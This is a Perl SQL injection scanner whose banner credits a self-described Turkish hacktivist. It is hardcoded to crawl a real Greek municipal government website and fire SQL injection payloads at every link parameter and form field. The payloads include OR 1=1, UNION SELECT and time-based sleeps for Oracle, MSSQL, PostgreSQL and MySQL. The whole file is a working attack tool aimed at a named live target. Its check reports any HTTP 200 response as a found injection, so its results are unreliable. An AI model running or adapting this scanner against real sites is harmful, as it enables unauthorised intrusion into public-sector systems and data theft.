#!/usr/bin/perl
use strict;
use warnings;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Cookies;
use HTML::Form;
use Time::HiRes qw(gettimeofday tv_interval);
use Term::ANSIColor;
use URI;
use utf8;
binmode(STDOUT, ":utf8");

sub ascii_art {
    print color('bold red');
    print q{
  ____             _                  _       _   _ _______________ 
 |  _ \  __ _ _ __| | _____  ___ _ __(_)_ __ | |_/ |___ /___ /___  |
 | | | |/ _` | '__| |/ / __|/ __| '__| | '_ \| __| | |_ \ |_ \  / / 
 | |_| | (_| | |  |   <\__ \ (__| |  | | |_) | |_| |___) |__) |/ /  
 |____/ \__,_|_|  |_|\_\___/\___|_|  |_| .__/ \__|_|____/____//_/   
                                       |_|                          
    };
    print color('bold green');
    print "Coder By: RootAyyildiz Turkish Hacktivist\n";
    print color('reset');
}

ascii_art();

my $target = "https://agrinio.gov.gr/agrinio/index.php";

my $ua = LWP::UserAgent->new;
$ua->agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.3");
my $cookie_jar = HTTP::Cookies->new;
$ua->cookie_jar($cookie_jar);

my %payloads = (
    'oracle'     => ["' OR 1=1 --", "' UNION SELECT NULL,NULL FROM dual --", "' OR 1=1 AND dbms_pipe.receive_message('a',30) --"],
    'mssql'      => ["' OR 1=1 --", "' UNION SELECT NULL,NULL --", "' WAITFOR DELAY '0:0:30' --"],
    'postgresql' => ["' OR 1=1 --", "' UNION SELECT NULL,NULL --", "'; SELECT pg_sleep(30); --"],
    'mysql'      => ["' OR 1=1 --", "' UNION SELECT NULL,NULL --", "' OR SLEEP(30) --"],
    'tsql'       => ["' OR 1=1 --", "' UNION ALL SELECT NULL,NULL --", "' WAITFOR DELAY '0:0:30' --"],
);

my %error_signatures = (
    'mysql'      => ["You have an error in your SQL syntax", "Warning: mysql_", "MySQL server version"],
    'postgresql' => ["ERROR: syntax error at or near", "invalid input syntax for", "pg_query() [<a href"],
    'mssql'      => ["Unclosed quotation mark", "Microsoft OLE DB Provider for SQL Server", "The multi-part identifier"],
    'oracle'     => ["ORA-", "ORA-00933", "ORA-00936", "ORA-01756"],
);

sub check_sql_injection {
    my ($url, $payload) = @_;
    my $req = HTTP::Request->new(GET => $url . $payload);
    $req->header(Accept => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8');
    $req->header('User-Agent', $ua->agent);
    $req->header(Cookie => $cookie_jar->as_string);

    my $start_time = [gettimeofday];
    my $res = $ua->request($req);
    my $elapsed = tv_interval($start_time);
    my $content = $res->content;

    if ($res->code == 200) {
        if ($elapsed > 30) {
            print color('bold green');
            print "SQL injection bulundu (30+ saniye gecikti): $url$payload\n";
            print color('reset');
        } else {
            print color('bold green');
            print "SQL injection bulundu: $url$payload\n";
            print color('reset');
        }

        foreach my $dbms (keys %error_signatures) {
            foreach my $error (@{$error_signatures{$dbms}}) {
                if ($content =~ /\Q$error\E/i) {
                    print color('bold yellow');
                    print "$dbms veritabani hatasi bulundu: $error\n";
                    print color('reset');
                    last;
                }
            }
        }
    } else {
        print color('bold red');
        print "SQL injection bulunamadi: $url$payload\n";
        print color('reset');
    }
}

sub crawl_and_test {
    my ($url) = @_;
    my $req = HTTP::Request->new(GET => $url);
    my $res = $ua->request($req);

    if ($res->code == 200) {
        my $content = $res->content;
        print color('bold cyan');
        print "Sayfa taraniyor: $url\n";
        print color('reset');

        my @params = $content =~ /<a\s+href=['"]?([^'">]+)['"]?/g;
        foreach my $param (@params) {
            if ($param =~ /^https?:\/\//) {
                my $uri = URI->new($param);
                next unless $uri->host eq URI->new($target)->host;
            } else {
                $param = URI->new_abs($param, $target)->as_string;
            }

            print color('bold blue');
            print "Test URL: $param\n";
            print color('reset');

            if ($param =~ /\?/) {
                my @param_parts = split /\?/, $param;
                my $base_url = $param_parts[0];
                my $query_string = $param_parts[1];
                my @query_params = split /&/, $query_string;

                foreach my $query_param (@query_params) {
                    my ($key, $value) = split /=/, $query_param;

                    print color('bold magenta');
                    print "Test GET: $key=$value\n";
                    print color('reset');

                    foreach my $dbms (keys %payloads) {
                        foreach my $payload (@{$payloads{$dbms}}) {
                            print color('bold green');
                            print "Payload ($dbms): $payload\n";
                            print color('reset');
                            my $test_url = $base_url . "?" . $key . "=" . $value . $payload;
                            check_sql_injection($test_url, '');
                        }
                    }
                }
            }
        }

        my @forms = HTML::Form->parse($res);
        foreach my $form (@forms) {
            foreach my $input ($form->inputs) {
                print color('bold cyan');
                print "Form tespit edildi: " . $form->action . "\n";
                print color('reset');

                foreach my $dbms (keys %payloads) {
                    foreach my $payload (@{$payloads{$dbms}}) {
                        my $form_copy = $form->clone;
                        $form_copy->value($input->name, $payload);
                        print color('bold green');
                        print "Form Payload ($dbms): $payload\n";
                        print color('reset');

                        my $form_req = $form_copy->click;
                        my $start_time = [gettimeofday];
                        my $form_res = $ua->request($form_req);
                        my $elapsed = tv_interval($start_time);
                        if ($form_res->code == 200 && $elapsed > 30) {
                            print color('bold green');
                            print "SQL injection bulundu (30+ saniye gecikti): " . $form->action . "\n";
                            print color('reset');
                        }
                    }
                }
            }
        }
    } else {
        print color('bold red');
        print "Hedef URL'ye ulasilamadi! Tarama iptal edildi.\n";
        print color('reset');
    }
}

crawl_and_test($target);
